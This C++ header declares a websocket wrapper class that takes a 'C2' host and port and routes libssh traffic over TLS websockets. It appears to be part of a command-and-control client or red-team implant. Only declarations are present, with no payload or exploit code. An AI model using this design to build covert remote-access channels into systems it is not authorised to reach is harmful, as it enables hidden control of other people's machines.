#pragma once

#ifndef ASIO_STANDALONE
#define ASIO_STANDALONE
#endif

#include <websocketpp/config/asio_client.hpp>
#include <websocketpp/client.hpp>

#include <libssh/libssh.h>

class WebsocketsWrapper
{ 
    typedef websocketpp::lib::shared_ptr<websocketpp::lib::asio::ssl::context> context_ptr;
    typedef websocketpp::config::asio_client::message_type::ptr message_ptr;

public:
    typedef websocketpp::client<websocketpp::config::asio_tls_client> client;

    bool is_connected();
    client::connection_ptr con; // ToDo move to private

    WebsocketsWrapper(const char* C2_host, unsigned short C2_port, std::shared_ptr<asio::io_service> io);

    // io callbacks
    static int recv_cb(socket_t socket, void* userdata, char* buffer, int size);
    static int send_cb(socket_t socket, void* userdata, const char* buffer, int size);
    static void close_cb(socket_t socket, void* userdata);

    websocketpp::lib::asio::io_service* get_io_service();
    void run();
    

private:

    client ws_client;
    std::string uri;
    
    bool connected;
    static std::vector<unsigned char> buffer;
    static std::mutex mtx;
    std::shared_ptr<std::thread> io_thread;
    websocketpp::lib::asio::ssl::stream<websocketpp::lib::asio::ip::tcp::socket>* socket;
    
    void conn_socket_handler(websocketpp::connection_hdl hdl, websocketpp::lib::asio::ssl::stream<websocketpp::lib::asio::ip::tcp::socket>& thing);
    
    static context_ptr on_tls_init(websocketpp::connection_hdl);
    void on_message(client* c, websocketpp::connection_hdl hdl, message_ptr msg);


};

